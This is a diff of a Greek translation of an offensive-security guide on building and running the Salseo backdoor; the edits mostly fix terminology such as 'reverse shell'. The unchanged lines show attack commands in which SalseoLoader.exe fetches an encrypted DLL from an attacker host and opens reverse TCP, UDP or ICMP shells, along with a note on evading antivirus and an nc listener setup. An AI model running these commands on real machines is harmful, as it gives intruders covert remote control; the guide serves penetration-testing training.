@@ -10,7 +10,7 @@
 
 Μπορείτε να **επιλέξετε την αρχιτεκτονική** μέσα στο Visual Studio στην **αριστερή καρτέλα "Build"** στην **"Platform Target".**
 
-(\*\*Αν δεν μπορείτε να βρείτε αυτές τις επιλογές, πατήστε στην **"Project Tab"** και στη συνέχεια στην **"\<Project Name> Properties"**)
+(**Αν δεν μπορείτε να βρείτε αυτές τις επιλογές, πατήστε στην **"Project Tab"** και στη συνέχεια στην **"\<Project Name> Properties"**)
 
 ![](<../images/image (132).png>)
 
@@ -32,9 +32,9 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Εντάξει, τώρα έχετε όλα όσα χρειάζεστε για να εκτελέσετε όλα τα πράγματα Salseo: το **encoded EvilDalsa.dll** και το **binary of SalseoLoader.**
+Εντάξει, τώρα έχετε όλα όσα χρειάζεστε για να εκτελέσετε όλα τα πράγματα του Salseo: το **encoded EvilDalsa.dll** και το **binary of SalseoLoader.**
 
-**Ανεβάστε το SalseoLoader.exe binary στη μηχανή. Δεν θα πρέπει να ανιχνεύονται από κανένα AV...**
+**Ανεβάστε το SalseoLoader.exe binary στη μηχανή. Δεν θα πρέπει να ανιχνευτούν από κανένα AV...**
 
 ## **Εκτέλεση του backdoor**
 
@@ -50,9 +50,9 @@ SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Att
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Λήψη ICMP αντίστροφης θύρας (κωδικοποιημένο dll ήδη μέσα στο θύμα)**
+### **Λήψη ICMP reverse shell (κωδικοποιημένο dll ήδη μέσα στον θύμα)**
 
-**Αυτή τη φορά χρειάζεστε ένα ειδικό εργαλείο στον πελάτη για να λάβετε την αντίστροφη θύρα. Κατεβάστε:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Αυτή τη φορά χρειάζεστε ένα ειδικό εργαλείο στον πελάτη για να λάβετε το reverse shell. Κατεβάστε:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **Απενεργοποίηση Απαντήσεων ICMP:**
 ```
@@ -85,7 +85,7 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 #### **Αναζητήστε το πακέτο DllExport (χρησιμοποιώντας την καρτέλα Αναζήτησης) και πατήστε Εγκατάσταση (και αποδεχτείτε το αναδυόμενο παράθυρο)**
 
-![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 Στο φάκελο του έργου σας έχουν εμφανιστεί τα αρχεία: **DllExport.bat** και **DllExport_Configure.bat**
 
@@ -131,9 +131,9 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
-Αν δεν εμφανιστεί σφάλμα, πιθανότατα έχετε ένα λειτουργικό DLL!!
+Αν δεν εμφανιστεί σφάλμα, πιθανότατα έχετε μια λειτουργική DLL!!
 
-## Πάρτε ένα shell χρησιμοποιώντας το DLL
+## Αποκτήστε ένα shell χρησιμοποιώντας τη DLL
 
 Μην ξεχάσετε να χρησιμοποιήσετε έναν **HTTP** **server** και να ρυθμίσετε έναν **nc** **listener**
 
